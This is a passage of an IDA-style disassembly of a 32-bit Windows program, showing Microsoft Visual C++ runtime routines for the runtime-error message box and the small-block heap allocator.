		push	offset aRuntimeErrorPr ; "Runtime Error!\n\nProgram: "
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_A0]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_A0]
		push	offset asc_41139C ; "\n\n"
		push	eax		; char *
		call	_strcat
		push	off_43995C[esi]	; char *
		lea	eax, [ebp+var_A0]
		push	eax		; char *
		call	_strcat
		push	12010h
		lea	eax, [ebp+var_A0]
		push	offset aMicrosoftVisua ; "Microsoft Visual C++ Runtime Library"
		push	eax
		call	___crtMessageBoxA
		add	esp, 2Ch
		pop	edi
		jmp	short loc_40421D
; ---------------------------------------------------------------------------

loc_4041F7:				; CODE XREF: sub_4040CD+3Cj
					; sub_4040CD+4Dj
		lea	eax, [ebp+NumberOfBytesWritten]
		lea	esi, off_43995C[esi]
		push	0		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	dword ptr [esi]	; char *
		call	_strlen
		pop	ecx
		push	eax		; nNumberOfBytesToWrite
		push	dword ptr [esi]	; lpBuffer
		push	0FFFFFFF4h	; nStdHandle
		call	ds:GetStdHandle
		push	eax		; hFile
		call	ds:WriteFile

loc_40421D:				; CODE XREF: sub_4040CD+2Ej
					; sub_4040CD+59j ...
		pop	esi
		leave
		retn
sub_4040CD	endp

; ---------------------------------------------------------------------------
		mov	ecx, [esp+4]
		xor	edx, edx
		mov	eax, offset dword_439958

loc_40422B:				; CODE XREF: .text:00404238j
		cmp	ecx, [eax]
		jz	short loc_40423A
		add	eax, 8
		inc	edx
		cmp	eax, offset off_4399E8
		jb	short loc_40422B

loc_40423A:				; CODE XREF: .text:0040422Dj
		mov	eax, edx
		shl	eax, 3
		cmp	ecx, dword_439958[eax]
		jnz	short loc_40424E
		mov	eax, off_43995C[eax]
		retn
; ---------------------------------------------------------------------------

loc_40424E:				; CODE XREF: .text:00404245j
		xor	eax, eax
		retn
; [00000024 BYTES: COLLAPSED FUNCTION _set_new_handler(int (*)(uint)). PRESS KEYPAD CTRL-"+" TO	EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, dword_43D6A8
		retn
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, dword_43DBA8
		cmp	eax, 3
		jnz	short loc_4042A6
		mov	eax, dword_43DB94
		retn
; ---------------------------------------------------------------------------

loc_4042A6:				; CODE XREF: .text:0040429Ej
		dec	eax
		dec	eax
		neg	eax
		sbb	eax, eax
		not	eax
		and	eax, dword_43BA0C
		retn
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		mov	eax, dword_43DBA8
		push	esi
		cmp	eax, 3
		jnz	short loc_4042DB
		mov	eax, [ebp+8]
		cmp	eax, 3F8h
		ja	loc_404363
		mov	dword_43DB94, eax
		jmp	loc_40435E
; ---------------------------------------------------------------------------

loc_4042DB:				; CODE XREF: .text:004042C1j
		cmp	eax, 2
		jnz	short loc_4042F6
		mov	eax, [ebp+8]
		add	eax, 0Fh
		and	al, 0F0h
		cmp	eax, 780h
		ja	short loc_404363
		mov	dword_43BA0C, eax
		jmp	short loc_40435E
; ---------------------------------------------------------------------------

loc_4042F6:				; CODE XREF: .text:004042DEj
		cmp	eax, 1
		jnz	short loc_404363
		mov	esi, [ebp+8]
		test	esi, esi
		jbe	short loc_404363
		lea	eax, [ebp+8]
		push	eax
		call	sub_403D39
		cmp	byte ptr [ebp+8], 6
		pop	ecx
		jb	short loc_404337
		cmp	esi, 3F8h
		ja	short loc_404363
		push	esi
		call	___sbh_heap_init
		test	eax, eax
		pop	ecx
		jz	short loc_404363
		mov	dword_43DB94, esi
		mov	dword_43DBA8, 3
		jmp	short loc_40435E
; ---------------------------------------------------------------------------

loc_404337:				; CODE XREF: .text:00404310j
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		cmp	esi, 780h
		ja	short loc_404363
		call	sub_4052D1
		test	eax, eax
		jz	short loc_404363
		mov	dword_43BA0C, esi
		mov	dword_43DBA8, 2

loc_40435E:				; CODE XREF: .text:004042D6j
					; .text:004042F4j ...
		push	1
		pop	eax
		jmp	short loc_404365
; ---------------------------------------------------------------------------

loc_404363:				; CODE XREF: .text:004042CBj
					; .text:004042EDj ...
		xor	eax, eax

loc_404365:				; CODE XREF: .text:00404361j
		pop	esi
		pop	ebp
		retn
; [00000048 BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4043DB	proc near		; CODE XREF: sub_402821+54p
					; sub_40BBAD+D0p ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	ecx, [ebp+arg_0]
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, [ecx+10h]
		push	edi
		mov	edi, esi
		add	esi, 0FFFFFFFCh
		sub	edi, [ecx+0Ch]
		shr	edi, 0Fh
		mov	ecx, edi
		imul	ecx, 204h
		lea	ecx, [ecx+eax+144h]
		mov	[ebp+var_10], ecx
		mov	ecx, [esi]
		dec	ecx
		test	cl, 1
		mov	[ebp+var_4], ecx
		jnz	loc_4046FF
		mov	edx, [ecx+esi]
		lea	ebx, [ecx+esi]
		mov	[ebp+var_C], edx
		mov	edx, [esi-4]
		mov	[ebp+var_8], edx
		mov	edx, [ebp+var_C]
		test	dl, 1
		mov	[ebp+arg_4], ebx
		jnz	short loc_4044B1
		sar	edx, 4
		dec	edx
		cmp	edx, 3Fh
		jbe	short loc_40443F
		push	3Fh
		pop	edx

loc_40443F:				; CODE XREF: sub_4043DB+5Fj
		mov	ecx, [ebx+4]
		cmp	ecx, [ebx+8]
		jnz	short loc_404493
		cmp	edx, 20h
		jnb	short loc_40446A
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		lea	ecx, [edx+eax+4]
		not	ebx
		and	[eax+edi*4+44h], ebx
		dec	byte ptr [ecx]
		jnz	short loc_40448B
		mov	ecx, [ebp+arg_0]
		and	[ecx], ebx
		jmp	short loc_40448B
; ---------------------------------------------------------------------------

loc_40446A:				; CODE XREF: sub_4043DB+6Fj
		lea	ecx, [edx-20h]
		mov	ebx, 80000000h
		shr	ebx, cl
		lea	ecx, [edx+eax+4]
		not	ebx
		and	[eax+edi*4+0C4h], ebx
		dec	byte ptr [ecx]
		jnz	short loc_40448B
		mov	ecx, [ebp+arg_0]
		and	[ecx+4], ebx

loc_40448B:				; CODE XREF: sub_4043DB+86j
					; sub_4043DB+8Dj ...
		mov	ecx, [ebp+var_4]
		mov	ebx, [ebp+arg_4]
		jmp	short loc_404496
; ---------------------------------------------------------------------------

loc_404493:				; CODE XREF: sub_4043DB+6Aj
		mov	ecx, [ebp+var_4]

loc_404496:				; CODE XREF: sub_4043DB+B6j
		mov	edx, [ebx+8]
		mov	ebx, [ebx+4]
		add	ecx, [ebp+var_C]
		mov	[edx+4], ebx
		mov	edx, [ebp+arg_4]
		mov	[ebp+var_4], ecx
		mov	ebx, [edx+4]
		mov	edx, [edx+8]
		mov	[ebx+8], edx

loc_4044B1:				; CODE XREF: sub_4043DB+56j
		mov	edx, ecx
		sar	edx, 4
		dec	edx
		cmp	edx, 3Fh
		jbe	short loc_4044BF
		push	3Fh
		pop	edx

loc_4044BF:				; CODE XREF: sub_4043DB+DFj
		mov	ebx, [ebp+var_8]
		and	ebx, 1
		mov	[ebp+var_C], ebx
		jnz	loc_404562
		sub	esi, [ebp+var_8]
		mov	ebx, [ebp+var_8]
		sar	ebx, 4
		push	3Fh
		mov	[ebp+arg_4], esi
		dec	ebx
		pop	esi
		cmp	ebx, esi
		jbe	short loc_4044E4
		mov	ebx, esi

loc_4044E4:				; CODE XREF: sub_4043DB+105j
		add	ecx, [ebp+var_8]
		mov	edx, ecx
		mov	[ebp+var_4], ecx
		sar	edx, 4
		dec	edx
		cmp	edx, esi
		jbe	short loc_4044F6
		mov	edx, esi

loc_4044F6:				; CODE XREF: sub_4043DB+117j
		cmp	ebx, edx
		jz	short loc_40455D
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+4]
		cmp	esi, [ecx+8]
		jnz	short loc_404545
		cmp	ebx, 20h
		jnb	short loc_404526
		mov	esi, 80000000h
		mov	ecx, ebx
		shr	esi, cl
		not	esi
		and	[eax+edi*4+44h], esi
		dec	byte ptr [ebx+eax+4]
		jnz	short loc_404545
		mov	ecx, [ebp+arg_0]
		and	[ecx], esi
		jmp	short loc_404545
; ---------------------------------------------------------------------------

loc_404526:				; CODE XREF: sub_4043DB+12Dj
		lea	ecx, [ebx-20h]
		mov	esi, 80000000h
		shr	esi, cl
		not	esi
		and	[eax+edi*4+0C4h], esi
		dec	byte ptr [ebx+eax+4]
		jnz	short loc_404545
		mov	ecx, [ebp+arg_0]
		and	[ecx+4], esi

loc_404545:				; CODE XREF: sub_4043DB+128j
					; sub_4043DB+142j ...
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+8]
		mov	ecx, [ecx+4]
		mov	[esi+4], ecx
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+4]
		mov	ecx, [ecx+8]
		mov	[esi+8], ecx

loc_40455D:				; CODE XREF: sub_4043DB+11Dj
		mov	esi, [ebp+arg_4]
		jmp	short loc_404565
; ---------------------------------------------------------------------------

loc_404562:				; CODE XREF: sub_4043DB+EDj
		mov	ebx, [ebp+arg_0]

loc_404565:				; CODE XREF: sub_4043DB+185j
		cmp	[ebp+var_C], 0
		jnz	short loc_404573
		cmp	ebx, edx
		jz	loc_4045F4

loc_404573:				; CODE XREF: sub_4043DB+18Ej
		mov	ecx, [ebp+var_10]
		mov	ebx, [ecx+edx*8+4]
		lea	ecx, [ecx+edx*8]
		mov	[esi+4], ebx
		mov	[esi+8], ecx
		mov	[ecx+4], esi
		mov	ecx, [esi+4]
		mov	[ecx+8], esi
		mov	ecx, [esi+4]
		cmp	ecx, [esi+8]
		jnz	short loc_4045F4
		mov	cl, [edx+eax+4]
		cmp	edx, 20h
		mov	byte ptr [ebp+arg_4+3],	cl
		inc	cl
		mov	[edx+eax+4], cl
		jnb	short loc_4045CB
		cmp	byte ptr [ebp+arg_4+3],	0
		jnz	short loc_4045BA
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		mov	ecx, [ebp+arg_0]
		or	[ecx], ebx

loc_4045BA:				; CODE XREF: sub_4043DB+1CFj
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		lea	eax, [eax+edi*4+44h]
		or	[eax], ebx
		jmp	short loc_4045F4
; ---------------------------------------------------------------------------

loc_4045CB:				; CODE XREF: sub_4043DB+1C9j
		cmp	byte ptr [ebp+arg_4+3],	0
		jnz	short loc_4045E1
		lea	ecx, [edx-20h]
		mov	ebx, 80000000h
		shr	ebx, cl
		mov	ecx, [ebp+arg_0]
		or	[ecx+4], ebx

loc_4045E1:				; CODE XREF: sub_4043DB+1F4j
		lea	ecx, [edx-20h]
		mov	edx, 80000000h
		shr	edx, cl
		lea	eax, [eax+edi*4+0C4h]
		or	[eax], edx

loc_4045F4:				; CODE XREF: sub_4043DB+192j
					; sub_4043DB+1B7j ...
		mov	eax, [ebp+var_4]
		mov	[esi], eax
		mov	[eax+esi-4], eax
		mov	eax, [ebp+var_10]
		dec	dword ptr [eax]
		jnz	loc_4046FF
		mov	eax, dword_43DB88
		test	eax, eax
		jz	loc_4046F1
		mov	ecx, dword_43DB7C
		mov	esi, ds:VirtualFree
		shl	ecx, 0Fh
		add	ecx, [eax+0Ch]
		mov	ebx, 8000h
		push	4000h		; dwFreeType
		push	ebx		; dwSize
		push	ecx		; lpAddress
		call	esi ; VirtualFree
		mov	ecx, dword_43DB7C
		mov	eax, dword_43DB88
		mov	edx, 80000000h
		shr	edx, cl
		or	[eax+8], edx
		mov	eax, dword_43DB88
		mov	ecx, dword_43DB7C
		mov	eax, [eax+10h]
		and	dword ptr [eax+ecx*4+0C4h], 0
		mov	eax, dword_43DB88
		mov	eax, [eax+10h]
		dec	byte ptr [eax+43h]
		mov	eax, dword_43DB88
		mov	ecx, [eax+10h]
		cmp	byte ptr [ecx+43h], 0
		jnz	short loc_404682
		and	dword ptr [eax+4], 0FFFFFFFEh
		mov	eax, dword_43DB88

loc_404682:				; CODE XREF: sub_4043DB+29Cj
		cmp	dword ptr [eax+8], 0FFFFFFFFh
		jnz	short loc_4046F1
		push	ebx		; dwFreeType
		push	0		; dwSize
		push	dword ptr [eax+0Ch] ; lpAddress
		call	esi ; VirtualFree
		mov	eax, dword_43DB88
		push	dword ptr [eax+10h] ; lpMem
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapFree
		mov	eax, dword_43DB8C
		mov	edx, lp
		lea	eax, [eax+eax*4]
		shl	eax, 2
		mov	ecx, eax
		mov	eax, dword_43DB88
		sub	ecx, eax
		lea	ecx, [ecx+edx-14h]
		push	ecx		; size_t
		lea	ecx, [eax+14h]
		push	ecx		; void *
		push	eax		; void *
		call	_memcpy
		mov	eax, [ebp+arg_0]
		add	esp, 0Ch
		dec	dword_43DB8C
		cmp	eax, dword_43DB88
		jbe	short loc_4046E7
		sub	[ebp+arg_0], 14h

loc_4046E7:				; CODE XREF: sub_4043DB+306j
		mov	eax, lp
		mov	dword_43DB80, eax

loc_4046F1:				; CODE XREF: sub_4043DB+234j
					; sub_4043DB+2ABj
		mov	eax, [ebp+arg_0]
		mov	dword_43DB7C, edi
		mov	dword_43DB88, eax

loc_4046FF:				; CODE XREF: sub_4043DB+38j
					; sub_4043DB+227j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4043DB	endp

; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000002F6 BYTES: COLLAPSED FUNCTION ___sbh_resize_block. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

___sbh_heapmin:
		mov	eax, dword_43DB88
		test	eax, eax
		jz	locret_404F7F
		mov	ecx, dword_43DB7C
		push	4000h
		shl	ecx, 0Fh
		add	ecx, [eax+0Ch]
		push	8000h
		push	ecx
		call	ds:VirtualFree
		mov	ecx, dword_43DB7C
		mov	eax, dword_43DB88
		mov	edx, 80000000h
		shr	edx, cl
		or	[eax+8], edx
		mov	eax, dword_43DB88
		mov	ecx, dword_43DB7C
		mov	eax, [eax+10h]
		and	dword ptr [eax+ecx*4+0C4h], 0
		mov	eax, dword_43DB88
		mov	eax, [eax+10h]
		dec	byte ptr [eax+43h]
		mov	eax, dword_43DB88
		mov	ecx, [eax+10h]
		cmp	byte ptr [ecx+43h], 0
		jnz	short loc_404F26
		and	dword ptr [eax+4], 0FFFFFFFEh
		mov	eax, dword_43DB88

loc_404F26:				; CODE XREF: .text:00404F1Bj
		cmp	dword ptr [eax+8], 0FFFFFFFFh
		jnz	short loc_404F78
		cmp	dword_43DB8C, 1
		jle	short loc_404F78
		push	dword ptr [eax+10h]
		push	0
		push	hHeap
		call	ds:HeapFree
		mov	eax, dword_43DB8C
		mov	edx, lp
		lea	eax, [eax+eax*4]
		shl	eax, 2
		mov	ecx, eax
		mov	eax, dword_43DB88
		sub	ecx, eax
		lea	ecx, [ecx+edx-14h]
		push	ecx
		lea	ecx, [eax+14h]
		push	ecx
		push	eax
		call	_memcpy
		add	esp, 0Ch
		dec	dword_43DB8C

loc_404F78:				; CODE XREF: .text:00404F2Aj
					; .text:00404F33j
		and	dword_43DB88, 0

locret_404F7F:				; CODE XREF: .text:00404EB6j
		retn
; [0000032F BYTES: COLLAPSED FUNCTION ___sbh_heap_check. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, dword_43BA0C
		retn
; ---------------------------------------------------------------------------
		mov	eax, [esp+4]
		add	eax, 0Fh
		and	al, 0F0h
		cmp	eax, 780h
		ja	short loc_4052CE
		push	1
		mov	dword_43BA0C, eax
		pop	eax
		retn
; ---------------------------------------------------------------------------

loc_4052CE:				; CODE XREF: .text:004052C3j
		xor	eax, eax
		retn

; =============== S U B	R O U T	I N E =======================================


sub_4052D1	proc near		; CODE XREF: sub_403EAE+41p
					; .text:00404345p ...
		cmp	dword_4399F8, 0FFFFFFFFh
		push	ebx
		push	ebp
		push	esi
		push	edi
		jnz	short loc_4052E5
		mov	esi, offset off_4399E8
		jmp	short loc_405302
; ---------------------------------------------------------------------------

loc_4052E5:				; CODE XREF: sub_4052D1+Bj
		push	2020h		; dwBytes
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc
		mov	esi, eax
		test	esi, esi
		jz	loc_40540E

loc_405302:				; CODE XREF: sub_4052D1+12j
		mov	ebp, ds:VirtualAlloc
		push	4		; flProtect
		push	2000h		; flAllocationType
		push	400000h		; dwSize
		push	0		; lpAddress
		call	ebp ; VirtualAlloc
		mov	edi, eax
		test	edi, edi
		jz	loc_4053F7
		push	4		; flProtect
		mov	ebx, 10000h
		push	1000h		; flAllocationType
		push	ebx		; dwSize
		push	edi		; lpAddress
		call	ebp ; VirtualAlloc
		test	eax, eax
		jz	loc_4053E9
		mov	eax, offset off_4399E8
		cmp	esi, eax
		jnz	short loc_405361
		cmp	off_4399E8, 0
		jnz	short loc_405351
		mov	off_4399E8, eax

loc_405351:				; CODE XREF: sub_4052D1+79j
		cmp	lpMem, 0
		jnz	short loc_405376
		mov	lpMem, eax
		jmp	short loc_405376
; ---------------------------------------------------------------------------

loc_405361:				; CODE XREF: sub_4052D1+70j
		mov	[esi], eax
		mov	eax, lpMem
		mov	[esi+4], eax
		mov	lpMem, esi
		mov	eax, [esi+4]
		mov	[eax], esi

loc_405376:				; CODE XREF: sub_4052D1+87j
					; sub_4052D1+8Ej
		lea	eax, [edi+400000h]
		lea	ecx, [esi+98h]
		mov	[esi+14h], eax
		lea	eax, [esi+18h]
		mov	[esi+0Ch], ecx
		mov	[esi+10h], edi
		mov	[esi+8], eax
		xor	ebp, ebp
		mov	ecx, 0F1h

loc_405398:				; CODE XREF: sub_4052D1+E2j
		xor	edx, edx
		cmp	ebp, 10h
		setnl	dl
		dec	edx
		and	edx, ecx
		dec	edx
		inc	ebp
		mov	[eax], edx
		mov	[eax+4], ecx
		add	eax, 8
		cmp	ebp, 400h
		jl	short loc_405398
		push	ebx		; size_t
		push	0		; int
		push	edi		; void *
		call	_memset
		add	esp, 0Ch

loc_4053C1:				; CODE XREF: sub_4052D1+112j
		mov	eax, [esi+10h]
		add	eax, ebx
		cmp	edi, eax
		jnb	short loc_4053E5
		or	byte ptr [edi+0F8h], 0FFh
		lea	eax, [edi+8]
		mov	[edi], eax
		mov	dword ptr [edi+4], 0F0h
		add	edi, 1000h
		jmp	short loc_4053C1
; ---------------------------------------------------------------------------

loc_4053E5:				; CODE XREF: sub_4052D1+F7j
		mov	eax, esi
		jmp	short loc_405410
; ---------------------------------------------------------------------------

loc_4053E9:				; CODE XREF: sub_4052D1+63j
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	edi		; lpAddress
		call	ds:VirtualFree

loc_4053F7:				; CODE XREF: sub_4052D1+4Bj
		cmp	esi, offset off_4399E8
		jz	short loc_40540E
		push	esi		; lpMem
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapFree

loc_40540E:				; CODE XREF: sub_4052D1+2Bj
					; sub_4052D1+12Cj
		xor	eax, eax

loc_405410:				; CODE XREF: sub_4052D1+116j
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn
sub_4052D1	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_405415(LPVOID	lpMem)
sub_405415	proc near		; CODE XREF: sub_40546B+A5p

lpMem		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+lpMem]
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	dword ptr [esi+10h] ; lpAddress
		call	ds:VirtualFree
		cmp	off_43BA08, esi
		jnz	short loc_40543A
		mov	eax, [esi+4]
		mov	off_43BA08, eax

loc_40543A:				; CODE XREF: sub_405415+1Bj
		cmp	esi, offset off_4399E8
		jz	short loc_405462
		mov	eax, [esi+4]
		mov	ecx, [esi]
		push	esi		; lpMem
		push	0		; dwFlags
		mov	[eax], ecx
		mov	eax, [esi]
		mov	ecx, [esi+4]
		mov	[eax+4], ecx
		push	hHeap		; hHeap
		call	ds:HeapFree
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_405462:				; CODE XREF: sub_405415+2Bj
		or	dword_4399F8, 0FFFFFFFFh
		pop	esi
		retn
sub_405415	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40546B	proc near		; CODE XREF: sub_405584+3Ep

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, lpMem
		push	edi

loc_405478:				; CODE XREF: sub_40546B+B7j
		cmp	dword ptr [esi+10h], 0FFFFFFFFh
		jz	loc_405516
		and	[ebp+var_4], 0
		lea	edi, [esi+2010h]
		mov	ebx, 3FF000h

loc_405491:				; CODE XREF: sub_40546B+72j
		cmp	dword ptr [edi], 0F0h
		jnz	short loc_4054D2
		mov	eax, ebx
		push	4000h		; dwFreeType
		add	eax, [esi+10h]
		push	1000h		; dwSize
		push	eax		; lpAddress
		call	ds:VirtualFree
		test	eax, eax
		jz	short loc_4054D2
		or	dword ptr [edi], 0FFFFFFFFh
		dec	dword_43D6AC
		mov	eax, [esi+0Ch]
		test	eax, eax
		jz	short loc_4054C7
		cmp	eax, edi
		jbe	short loc_4054CA

loc_4054C7:				; CODE XREF: sub_40546B+56j
		mov	[esi+0Ch], edi

loc_4054CA:				; CODE XREF: sub_40546B+5Aj
		inc	[ebp+var_4]
		dec	[ebp+arg_0]
		jz	short loc_4054DF

loc_4054D2:				; CODE XREF: sub_40546B+2Cj
					; sub_40546B+46j
		sub	ebx, 1000h
		sub	edi, 8
		test	ebx, ebx
		jge	short loc_405491

loc_4054DF:				; CODE XREF: sub_40546B+65j
		cmp	[ebp+var_4], 0
		mov	ecx, esi
		mov	esi, [esi+4]
		jz	short loc_405516
		cmp	dword ptr [ecx+18h], 0FFFFFFFFh
		jnz	short loc_405516
		push	1
		lea	eax, [ecx+20h]
		pop	edx

loc_4054F6:				; CODE XREF: sub_40546B+9Aj
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	short loc_405507
		inc	edx
		add	eax, 8
		cmp	edx, 400h
		jl	short loc_4054F6

loc_405507:				; CODE XREF: sub_40546B+8Ej
		cmp	edx, 400h
		jnz	short loc_405516
		push	ecx		; lpMem
		call	sub_405415
		pop	ecx

loc_405516:				; CODE XREF: sub_40546B+11j
					; sub_40546B+7Dj ...
		cmp	esi, lpMem
		jz	short loc_405528
		cmp	[ebp+arg_0], 0
		jg	loc_405478

loc_405528:				; CODE XREF: sub_40546B+B1j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_40546B	endp


; =============== S U B	R O U T	I N E =======================================


sub_40552D	proc near		; CODE XREF: sub_402821+90p
					; sub_40BBAD+1D8p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		mov	edx, offset off_4399E8
		push	esi
		mov	ecx, edx

loc_405539:				; CODE XREF: sub_40552D+1Cj
		cmp	eax, [ecx+10h]
		jbe	short loc_405543
		cmp	eax, [ecx+14h]
		jb	short loc_40554B

loc_405543:				; CODE XREF: sub_40552D+Fj
		mov	ecx, [ecx]
		cmp	ecx, edx
		jz	short loc_405580
		jmp	short loc_405539
; ---------------------------------------------------------------------------

loc_40554B:				; CODE XREF: sub_40552D+14j
		test	al, 0Fh
		jnz	short loc_405580
		mov	esi, eax
		mov	edx, 100h
		and	esi, 0FFFh
		cmp	esi, edx
		jb	short loc_405580
		mov	esi, [esp+4+arg_4]
		mov	[esi], ecx
		mov	esi, [esp+4+arg_8]
		mov	ecx, eax
		and	cx, 0F000h
		sub	eax, ecx
		mov	[esi], ecx
		sub	eax, edx
		pop	esi
		sar	eax, 4
		lea	eax, [eax+ecx+8]
		retn
; ---------------------------------------------------------------------------

loc_405580:				; CODE XREF: sub_40552D+1Aj
					; sub_40552D+20j ...
		xor	eax, eax
		pop	esi
		retn
sub_40552D	endp


; =============== S U B	R O U T	I N E =======================================


sub_405584	proc near		; CODE XREF: sub_402821+A6p
					; sub_40BBAD+246p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		mov	ecx, [esp+arg_4]
		sub	ecx, [eax+10h]
		sar	ecx, 0Ch
		lea	eax, [eax+ecx*8+18h]
		mov	ecx, [esp+arg_8]
		movzx	edx, byte ptr [ecx]
		add	[eax], edx
		and	byte ptr [ecx],	0
		cmp	dword ptr [eax], 0F0h
		mov	dword ptr [eax+4], 0F1h
		jnz	short locret_4055C8
		inc	dword_43D6AC
		cmp	dword_43D6AC, 20h
		jnz	short locret_4055C8
		push	10h
		call	sub_40546B
		pop	ecx

locret_4055C8:				; CODE XREF: sub_405584+2Bj
					; sub_405584+3Aj
		retn
sub_405584	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4055C9	proc near		; CODE XREF: sub_402725+A7p
					; sub_4060A5+C4p ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, off_43BA08
		push	edi

loc_4055D7:				; CODE XREF: sub_4055C9+C6j
		mov	edx, [esi+10h]
		cmp	edx, 0FFFFFFFFh
		jz	loc_405682
		mov	edi, [esi+8]
		lea	ecx, [esi+2018h]
		mov	eax, edi
		sub	eax, esi
		sub	eax, 18h
		sar	eax, 3
		shl	eax, 0Ch
		add	eax, edx
		cmp	edi, ecx
		mov	[ebp+var_4], eax
		jnb	short loc_40563C

loc_405602:				; CODE XREF: sub_4055C9+6Fj
		mov	ecx, [edi]
		mov	ebx, [ebp+arg_0]
		cmp	ecx, ebx
		jl	short loc_405625
		cmp	[edi+4], ebx
		jbe	short loc_405625
		push	ebx
		push	ecx
		push	eax
		call	sub_4057D1
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_405694
		mov	eax, [ebp+var_4]
		mov	[edi+4], ebx

loc_405625:				; CODE XREF: sub_4055C9+40j
					; sub_4055C9+45j
		add	edi, 8
		lea	ecx, [esi+2018h]
		add	eax, 1000h
		cmp	edi, ecx
		mov	[ebp+var_4], eax
		jb	short loc_405602
		jmp	short loc_40563F
; ---------------------------------------------------------------------------

loc_40563C:				; CODE XREF: sub_4055C9+37j
		mov	ebx, [ebp+arg_0]

loc_40563F:				; CODE XREF: sub_4055C9+71j
		mov	eax, [esi+8]
		mov	ecx, [esi+10h]
		lea	edi, [esi+18h]
		mov	[ebp+var_8], eax
		cmp	edi, eax
		mov	[ebp+var_4], ecx
		jnb	short loc_405685

loc_405652:				; CODE XREF: sub_4055C9+B5j
		mov	eax, [edi]
		cmp	eax, ebx
		jl	short loc_405671
		cmp	[edi+4], ebx
		jbe	short loc_405671
		push	ebx
		push	eax
		push	[ebp+var_4]
		call	sub_4057D1
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_405694
		mov	[edi+4], ebx

loc_405671:				; CODE XREF: sub_4055C9+8Dj
					; sub_4055C9+92j
		add	[ebp+var_4], 1000h
		add	edi, 8
		cmp	edi, [ebp+var_8]
		jb	short loc_405652
		jmp	short loc_405685
; ---------------------------------------------------------------------------

loc_405682:				; CODE XREF: sub_4055C9+14j
		mov	ebx, [ebp+arg_0]

loc_405685:				; CODE XREF: sub_4055C9+87j
					; sub_4055C9+B7j
		mov	esi, [esi]
		cmp	esi, off_43BA08
		jz	short loc_4056A4
		jmp	loc_4055D7
; ---------------------------------------------------------------------------

loc_405694:				; CODE XREF: sub_4055C9+54j
					; sub_4055C9+A3j
		mov	off_43BA08, esi
		sub	[edi], ebx
		mov	[esi+8], edi
		jmp	loc_4057CC
; ---------------------------------------------------------------------------

loc_4056A4:				; CODE XREF: sub_4055C9+C4j
		mov	eax, offset off_4399E8
		mov	edi, eax

loc_4056AB:				; CODE XREF: sub_4055C9+F8j
		cmp	dword ptr [edi+10h], 0FFFFFFFFh
		jz	short loc_4056B7
		cmp	dword ptr [edi+0Ch], 0
		jnz	short loc_4056C3

loc_4056B7:				; CODE XREF: sub_4055C9+E6j
		mov	edi, [edi]
		cmp	edi, eax
		jz	loc_405798
		jmp	short loc_4056AB
; ---------------------------------------------------------------------------

loc_4056C3:				; CODE XREF: sub_4055C9+ECj
		mov	ebx, [edi+0Ch]
		and	[ebp+var_4], 0
		mov	esi, ebx
		mov	eax, ebx
		sub	esi, edi
		sub	esi, 18h
		sar	esi, 3
		shl	esi, 0Ch
		add	esi, [edi+10h]
		cmp	dword ptr [ebx], 0FFFFFFFFh
		jnz	short loc_4056F2

loc_4056E1:				; CODE XREF: sub_4055C9+127j
		cmp	[ebp+var_4], 10h
